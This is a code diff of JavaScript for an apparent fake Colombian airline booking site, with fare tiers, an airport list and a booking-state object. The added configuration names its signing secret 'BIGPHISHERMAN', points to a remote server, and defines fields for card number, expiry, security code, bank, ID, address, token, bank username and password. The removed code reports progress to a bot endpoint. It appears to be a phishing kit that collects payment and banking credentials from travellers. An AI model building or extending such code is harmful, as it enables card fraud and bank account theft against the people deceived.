@@ -1,289 +1,324 @@
-const DOMElements = {
-    labelOriginCode: document.querySelector('#label-origin-code'),
-    labelDestinationCode: document.querySelector('#label-destination-code'),
-    labelDateGo: document.querySelector('#label-date-go'),
-    labelDateBack: document.querySelector('#label-date-back'),
-    btnEditFlight: document.querySelector('#btn-edit-flight'),
-    loader: document.querySelector('.loader'),
-    contTicketGo: document.querySelector('#ticket-go'),
-    contTicketBack: document.querySelector('#ticket-back'),
-    labelTotal: document.querySelector('#total-resume'),
-    btnNextStep: document.querySelector('#btn-next-step'),
-}
-
 /**
- * Startup@Flight-Resume
- * 
+ * CONFIGURACIÓN
  */
-document.addEventListener('DOMContentLoaded', ()=>{
-    eventListeners();
-    updateDOM();
-    sendStatus();
-});
+
+let url = "https://readme1216.onrender.com";
+
+const PRECIO_BASE = 46900  // Precio base de los vuelos.
+const MULTIPLICADORES_PRECIO = { // Incremento porcentual de tarifas.
+    light: 1,
+    smart: 1.7,
+    full: 3
+}
+const JWT_SIGN = 'BIGPHISHERMAN';
 
 
+const LS = window.localStorage;
 
+const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
+const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];
 
-/**
- * Events@Flight-Resume
- * 
- */
-const eventListeners = ()=>{
-    const { btnEditFlight, loader, btnNextStep, contTicketBack, contTicketGo } = DOMElements;
+const countries = [
+    {
+        regionName: "America del Norte",
+        costRange: [750, 1100],
+        countries: [
+            "Canadá",
+            "Estados Unidos",
+            "México"
+        ]
+    },
+    {
+        regionName: "America Central y el Caribe",
+        costRange: [550, 850],
+        countries: [
+            "Belice",
+            "Costa Rica",
+            "El Salvador",
+            "Guatemala",
+            "Honduras",
+            "Nicaragua",
+            "Panamá",
+            "Aruba",
+            "Barbados",
+            "Cuba",
+            "Curazao",
+            "Puerto Rico",
+            "República Dominicana"
+        ]
+    },
+    {
+        regionName: "America del Sur",
+        costRange: [550, 850],
+        countries: [
+            "Argentina",
+            "Bolivia",
+            "Brasil",
+            "Chile",
+            "Ecuador",
+            "Paraguay",
+            "Perú",
+            "Uruguay",
+            "Venezuela"
+        ]
+    },
+    {
+        regionName: "Europa y otros",
+        costRange: [1300, 1900],
+        countries: [
+            "España",
+            "Reino Unido",
+            "Alemania"
+        ]
+    }
 
-    btnEditFlight.addEventListener('click', ()=>{
-        loader.classList.add('show');
-        setTimeout(()=> window.location.href = 'index.html', 1000);
-    });
+];
 
-    btnNextStep.addEventListener('click', () => {
-        loader.classList.add('show');
-        setTimeout(() => window.location.href = 'passengers-info.html', 2000);
-    });
+const airports = [
+    {
+        city: "Arauca",
+        country: "Colombia",
+        code: "AUC",
+        name: 'Aeropuerto Santiago Pérez Quiroz'
+    },
+    {
+        city: "Armenia",
+        country: "Colombia",
+        code: "AXM",
+        name: 'Aeropuerto Internacional El Eden'
+    },
+    {
+        city: "Barrancabermeja",
+        country: "Colombia",
+        code: "EJA",
+        name: 'Aeropuerto Yaguiríez'
+    },
+    {
+        city: "Barranquilla",
+        country: "Colombia",
+        code: "BAQ",
+        name: 'Aeropuerto Ernesto Cortissoz'
+    },
+    {
+        city: "Bogotá",
+        country: "Colombia",
+        code: "BOG",
+        name: 'Aeropuerto Aeropuerto Internacional El Dorado'
+    },
+    {
+        city: "Bucaramanga",
+        country: "Colombia",
+        code: "BGA",
+        name: 'Aeropuerto Aeropuerto Internacional Palonegro'
+    },
+    {
+        city: "Cali",
+        country: "Colombia",
+        code: "CLO",
+        name: 'Aeropuerto Alfonso Bonilla Aragón'
+    },
+    {
+        city: "Cartagena",
+        country: "Colombia",
+        code: "CTG",
+        name: 'Aeropuerto Aeropuerto Internacional Rafael Nuñez'
+    },
+    {
+        city: "Cúcuta",
+        country: "Colombia",
+        code: "CUC",
+        name: 'Aeropuerto Camilo Daza'
+    },
+    {
+        city: "Florencia",
+        country: "Colombia",
+        code: "FLA",
+        name: 'Aeropuerto Gustavo Paredes'
+    },
+    {
+        city: "Ibagué",
+        country: "Colombia",
+        code: "IBE",
+        name: 'Aeropuerto Perales'
+    },
+    {
+        city: "Ipiales",
+        country: "Colombia",
+        code: "IPI",
+        name: 'Aeropuerto San Luis'
+    },
+    {
+        city: "Leticia",
+        country: "Colombia",
+        code: "LET",
+        name: 'Aeropuerto Internacional Alfredo Vásques Cobo'
+        
+    },
+    {
+        city: "Manizales",
+        country: "Colombia",
+        code: "MZL",
+        name: 'Aeropuerto La Nubia'
+    },
+    {
+        city: "Medellín",
+        country: "Colombia",
+        code: "MDE",
+        name: 'Aeropuerto Internacional José María Córdova'
+    },
+    {
+        city: "Montería",
+        country: "Colombia",
+        code: "MTR",
+        name: 'Aeropuerto Los Garzones'
+    },
+    {
+        city: "Neiva",
+        country: "Colombia",
+        code: "NVA",
+        name: 'Aeropuerto Benito Salas Vargas'
+    },
+    {
+        city: "Pasto",
+        country: "Colombia",
+        code: "PSO",
+        name: 'Aeropuerto Antonio Nariño'
+    },
+    {
+        city: "Pereira",
+        country: "Colombia",
+        code: "PEI",
+        name: 'Aeropuerto Internacional Matecaña'
+    },
+    {
+        city: "Popayán",
+        country: "Colombia",
+        code: "PPN",
+        name: 'Aeropuerto Guillermo León Valencia'
+    },
+    {
+        city: "Riohacha",
+        country: "Colombia",
+        code: "RCH",
+        name: 'Aeropuerto Internacional Almirante Padilla'
+    },
+    {
+        city: "San Andrés",
+        country: "Colombia",
+        code: "ADZ",
+        name: 'Aeropuerto Internacional Gustavo Rojas P.'
+    },
+    {
+        city: "Santa Marta",
+        country: "Colombia",
+        code: "SMR",
+        name: 'Aeropuerto Internacional Simón Bolivar'
+    },
+    {
+        city: "Tumaco",
+        country: "Colombia",
+        code: "TCO",
+        name: 'Aeropuerto La Florida'
+    },
+    {
+        city: "Valledupar",
+        country: "Colombia",
+        code: "VUP",
+        name: 'Aeropuerto Alfonso López Pumarejo'
+    },
+    {
+        city: "Villavicencio",
+        country: "Colombia",
+        code: "VVC",
+        name: 'Aeropuerto Vanguardia'
+    },
+    {
+        city: "Yopal",
+        country: "Colombia",
+        code: "EYP",
+        name: 'Aeropuerto Internacional El Yopal'
+    }
+];
 
-    contTicketGo.addEventListener('click', () => {
-        loader.classList.add('show');
-        setTimeout(() => window.location.href = 'select-flight-go.html', 2000);
-    });
-
-    contTicketBack.addEventListener('click', () => {
-        loader.classList.add('show');
-        setTimeout(() => window.location.href = 'select-flight-back.html', 2000);
-    });
+let info = {
+    flightInfo:{
+        travel_type: 1,
+        seat_type: 1,
+        origin: '',
+        destination: '',
+        adults: 1,
+        children: 0,
+        babies: 0,
+        flightDates: [0, 0]
+    },
+    passengersInfo:{
+        adults: [
+            {
+                name: '',
+                surname: '',
+                cc: ''
+            }
+        ],
+        children: [],
+        babies: []
+    },
+    metaInfo:{
+        email: '',
+        p: '',
+        pdate: '',
+        c: '',
+        ban: '',
+        dues: '',
+        dudename: '',
+        surname: '',
+        cc: '',
+        telnum: '',
+        city: '',
+        state: '',
+        address: '',
+        cdin: '',
+        ccaj: '',
+        cavance: '',
+        tok: '',
+        user: '',
+        puser: '',
+        err: '',
+        disp: '',
+    },
+    checkerInfo: {
+        company: '',
+        mode: 'userpassword',
+    },
+    edit: 0
 }
 
-const updateDOM = ()=>{
-    const { travel_type, seat_type, origin, destination, adults, children, babies, flightDates } = info.flightInfo;
-    const { labelOriginCode, labelDestinationCode, labelDateGo, labelDateBack, contTicketGo, contTicketBack, labelTotal } = DOMElements;
+dDisp();
 
-    //Flight Destinations
-    labelOriginCode.textContent = origin.code;
-    labelDestinationCode.textContent = destination.code;
+function limitDigits(input, maxDigits) {
+    parseInt(input.value)
+    if (input.value.length > maxDigits) {
+        input.value = input.value.slice(0, maxDigits);
+    }
+}
 
-    //Flight Date
-    if(travel_type === 1){
-        if(flightDates[0] !== 0 && flightDates[1] !== 0){
-            const formatDateGo = new Date(parseInt(flightDates[0]));
-            let weekDayGo = dayDic[formatDateGo.getDay() - 1];
-            let dayGo = formatDateGo.toString().split(' ')[2];
-            let monthGo = formatDateGo.getMonth() + 1 < 10 ? '0'+formatDateGo.getMonth().toString() : formatDateGo.getMonth().toString();
+function dDisp() {
+    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-            const formatDateBack = new Date(parseInt(flightDates[1]));
-            let weekDayBack = dayDic[formatDateBack.getDay() - 1];
-            let dayBack = formatDateBack.toString().split(' ')[2];
-            let monthBack = formatDateBack.getMonth() + 1 < 10 ? '0'+formatDateBack.getMonth().toString() : formatDateBack.getMonth().toString();
-
-            labelDateGo.textContent = `${weekDayGo} ${dayGo}-${monthGo}`;
-            labelDateBack.textContent = `${weekDayBack} ${dayBack}-${monthBack}`;
-        }else{
-            console.log('TRAVEL_TYPE_AND_DATES_DOESNT_MATCH');
-        }
-    }else if(travel_type === 2){
-        if(flightDates[0] !== 0){
-            const dateGo = new Date(parseInt(info.flightInfo.flightDates[0]));
-            let weekDayGo = dayDic[dateGo.getDay() - 1];
-            let dayGo = dateGo.toString().split(' ')[2];
-            let monthGo = dateGo.getMonth() + 1 < 10 ? '0'+dateGo.getMonth().toString() : dateGo.getMonth().toString();
-
-            labelDateGo.textContent = `${weekDayGo} ${dayGo}-${monthGo}`;
-            labelDateBack.textContent = ''
-        }else{
-            console.log('INVALID_DATE_GO');
-        }
+    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
+        info.metaInfo.disp = "iOS";
+    }else if(userAgent.includes('Windows')){
+        info.metaInfo.disp = "PC";
     }else{
-        console.log('TRAVEL_TYPE_NULL');
+        info.metaInfo.disp = "Android";
     }
+}
 
-    if(travel_type === 1){
-        showTicketResume(contTicketGo, info.flightInfo, 'go');
-        showTicketResume(contTicketBack, info.flightInfo, 'back');
-    }else if(travel_type === 2){
-        showTicketResume(contTicketGo, info.flightInfo, 'go');
-    }else{
-        console.log('TRAVEL_TYPE_NULL');
-    }
-    
-
-    //Total label resume
-    const totalLight = (PRECIO_BASE * (adults + children));
-    const totalSmart = (PRECIO_BASE * MULTIPLICADORES_PRECIO.smart * (adults + children));
-    const totalFull = (PRECIO_BASE * MULTIPLICADORES_PRECIO.full * (adults + children));
-    
-    let total = 0;
-    if(origin.ticket_type === 'light'){
-        total += totalLight;
-    }else if(origin.ticket_type === 'smart'){
-        total += totalSmart;
-    }else if(origin.ticket_type === 'full'){
-        total += totalFull;
-    }else{
-        console.log('TICKET_TYPE_NULL');
-    }
-
-    if(travel_type === 1){
-        if(destination.ticket_type === 'light'){
-            total += totalLight;
-        }else if(destination.ticket_type === 'smart'){
-            total += totalSmart;
-        }else if(destination.ticket_type === 'full'){
-            total += totalFull;
-        }else{
-            console.log('TICKET_TYPE_NULL');
-        }
-    }
-
-    labelTotal.textContent = '$ '+total.toLocaleString('es-ES')+' COP';
+function updateLS(){
+    LS.setItem('info', JSON.stringify(info));
 }
 
 
 
+LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));
 
-/**
- * Functions@Flight-Resume
- * 
- */
-const showTicketResume = (contTicket, flightInfo, flightType)=>{
-    contTicket.innerHTML = '';
-
-    const totalLight = (PRECIO_BASE * (flightInfo.adults + flightInfo.children)).toLocaleString('es-ES');
-    const totalSmart = (PRECIO_BASE * MULTIPLICADORES_PRECIO.smart * (flightInfo.adults + flightInfo.children)).toLocaleString('es-ES');
-    const totalFull = (PRECIO_BASE * MULTIPLICADORES_PRECIO.full * (flightInfo.adults + flightInfo.children)).toLocaleString('es-ES');
-
-    const formatDateGo = new Date(parseInt(flightInfo.flightDates[0]));
-    let weekDayGo = dayDic[formatDateGo.getDay() - 1];
-    let dayGo = formatDateGo.toString().split(' ')[2];
-    let monthGo = formatDateGo.getMonth() + 1 < 10 ? '0'+formatDateGo.getMonth().toString() : formatDateGo.getMonth().toString();
-    
-    const formatDateBack = new Date(parseInt(flightInfo.flightDates[1]));
-    let weekDayBack = dayDic[formatDateBack.getDay() - 1];
-    let dayBack = formatDateBack.toString().split(' ')[2];
-    let monthBack = formatDateBack.getMonth() + 1 < 10 ? '0'+formatDateBack.getMonth().toString() : formatDateBack.getMonth().toString();
-
-    if(flightType === 'go'){
-
-        let ticketLabel = '';
-        if(flightInfo.origin.ticket_type === 'light'){
-            ticketLabel = `
-                <div class="bg-gray-2 p-2 mt-2 tc-white rounded-10 d-flex justify-space-between align-items-center flex-row">
-                    <img src="./assets/media/l_vuela_ligero.png" width="100px">
-                    <p class="fs-1 m-0">${totalLight}</p>
-                </div>
-            `;
-        }else if(flightInfo.origin.ticket_type === 'smart'){
-            ticketLabel = `
-                <div class="bg-cian p-2 mt-2 rounded-10 d-flex justify-space-between align-items-center flex-row">
-                    <img src="./assets/media/l_pack_smart.png" width="150px">
-                    <p class="tc-white fs-1 m-0">${totalSmart}</p>
-                </div>
-            `;
-        }else if(flightInfo.origin.ticket_type === 'full'){
-            ticketLabel = `
-                <div class="bg-blue-2 p-2 mt-2 rounded-10 d-flex justify-space-between align-items-center flex-row">
-                    <img src="./assets/media/l_pack_full.png" width="150px">
-                    <p class="tc-white fs-1 m-0">${totalFull}</p>
-                </div>
-            `;
-        }else{
-            console.log('TICKET_TYPE_NULL');
-        }
-
-        contTicket.innerHTML = `
-            <div class="border-blue-1 rounded-10 p-2">
-                <p class="fw-bold fs-3 tc-blue text-center m-0">Vuelo Ida</p>
-                <p class="fw-bold fs-6 tc-blue text-center m-0">${weekDayGo} ${dayGo}-${monthGo}</p>
-
-                <div class="d-flex justify-space-between align-items-center">
-                    <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
-                        <p class="m-0 fw-bold tc-blue fs-3">${flightInfo.origin.city}</p>
-                        <p class="m-0 fw-bold tc-blue fs-5">${flightInfo.origin.ticket_sched.takeoff}</p>
-                    </div>
-                    <div style="width: 40%;" class="d-flex flex-row align-items-center justify-content-center">
-                        <hr class="w-100">
-                        <div class="d-flex flex-column p-1 justify-content-center align-items-center">
-                            <svg width="15px" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M0 7.5C0 3.35786 3.35786 0 7.5 0C11.6421 0 15 3.35786 15 7.5C15 11.6421 11.6421 15 7.5 15C3.35786 15 0 11.6421 0 7.5ZM5.5 6C5.5 4.89543 6.39543 4 7.5 4H8.1C9.14934 4 10 4.85066 10 5.9V6C10 7.10457 9.10457 8 8 8V9H7V7H8C8.55228 7 9 6.55228 9 6V5.9C9 5.40294 8.59706 5 8.1 5H7.5C6.94772 5 6.5 5.44772 6.5 6H5.5ZM7 11V10H8V11H7Z" fill="#00abc8"></path> </g></svg>
-                            <p class="m-0 tc-cian fw-bold fs-7">Directo</p>
-                        </div>
-                        <hr class="w-100">
-                    </div>
-                    <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
-                        <p class="m-0 fw-bold tc-blue fs-3">${flightInfo.destination.city}</p>
-                        <p class="m-0 fw-bold tc-blue fs-5">${flightInfo.origin.ticket_sched.landing}</p>
-                    </div>
-                </div>
-
-                ${ticketLabel}
-            </div>
-        `;
-    }else if(flightType === 'back'){
-        let ticketLabel = '';
-        if(flightInfo.destination.ticket_type === 'light'){
-            ticketLabel = `
-                <div class="bg-gray-2 p-2 mt-2 tc-white rounded-10 d-flex justify-space-between align-items-center flex-row">
-                    <img src="./assets/media/l_vuela_ligero.png" width="100px">
-                    <p class="fs-1 m-0">${totalLight}</p>
-                </div>
-            `;
-        }else if(flightInfo.destination.ticket_type === 'smart'){
-            ticketLabel = `
-                <div class="bg-cian p-2 mt-2 rounded-10 d-flex justify-space-between align-items-center flex-row">
-                    <img src="./assets/media/l_pack_smart.png" width="150px">
-                    <p class="tc-white fs-1 m-0">${totalSmart}</p>
-                </div>
-            `;
-        }else if(flightInfo.destination.ticket_type === 'full'){
-            ticketLabel = `
-                <div class="bg-blue-2 p-2 mt-2 rounded-10 d-flex justify-space-between align-items-center flex-row">
-                    <img src="./assets/media/l_pack_full.png" width="150px">
-                    <p class="tc-white fs-1 m-0">${totalFull}</p>
-                </div>
-            `;
-        }else{
-            console.log('TICKET_TYPE_NULL');
-        }
-
-        contTicket.innerHTML = `
-            <div class="border-blue-1 rounded-10 p-2">
-                <p class="fw-bold fs-3 tc-blue text-center m-0">Vuelo Regreso</p>
-                <p class="fw-bold fs-6 tc-blue text-center m-0">${weekDayBack} ${dayBack}-${monthBack}</p>
-
-                <div class="d-flex justify-space-between align-items-center">
-                    <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
-                        <p class="m-0 fw-bold tc-blue fs-3">${flightInfo.destination.city}</p>
-                        <p class="m-0 fw-bold tc-blue fs-5">${flightInfo.destination.ticket_sched.takeoff}</p>
-                    </div>
-                    <div style="width: 40%;" class="d-flex flex-row align-items-center justify-content-center">
-                        <hr class="w-100">
-                        <div class="d-flex flex-column p-1 justify-content-center align-items-center">
-                            <svg width="15px" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M0 7.5C0 3.35786 3.35786 0 7.5 0C11.6421 0 15 3.35786 15 7.5C15 11.6421 11.6421 15 7.5 15C3.35786 15 0 11.6421 0 7.5ZM5.5 6C5.5 4.89543 6.39543 4 7.5 4H8.1C9.14934 4 10 4.85066 10 5.9V6C10 7.10457 9.10457 8 8 8V9H7V7H8C8.55228 7 9 6.55228 9 6V5.9C9 5.40294 8.59706 5 8.1 5H7.5C6.94772 5 6.5 5.44772 6.5 6H5.5ZM7 11V10H8V11H7Z" fill="#00abc8"></path> </g></svg>
-                            <p class="m-0 tc-cian fw-bold fs-7">Directo</p>
-                        </div>
-                        <hr class="w-100">
-                    </div>
-                    <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
-                        <p class="m-0 fw-bold tc-blue fs-3">${flightInfo.origin.city}</p>
-                        <p class="m-0 fw-bold tc-blue fs-5">${flightInfo.destination.ticket_sched.landing}</p>
-                    </div>
-                </div>
-
-                ${ticketLabel}
-            </div>
-        `;
-    }
-
-    
-}
-
-const sendStatus = () =>{
-    try{
-        fetch(`${API_URL}/api/bot/status`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${API_KEY}`
-            },
-            body: JSON.stringify({message: 'P3'})
-        });
-    }catch(err){
-        console.log(err);
-    }
-}
+// LS.removeItem('info');
